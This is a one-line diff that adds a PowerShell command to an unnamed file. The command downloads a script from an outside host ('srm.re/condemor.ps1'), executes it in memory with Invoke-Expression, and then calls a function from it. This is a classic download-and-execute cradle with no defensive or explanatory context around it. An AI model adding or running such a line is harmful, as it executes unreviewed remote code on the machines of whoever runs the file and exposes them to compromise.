@@ -1,0 +1,1 @@
+IEX (New-Object Net.WebClient).DownloadString("http://srm.re/condemor.ps1"); Invoke-PapaNoel -Jibiri
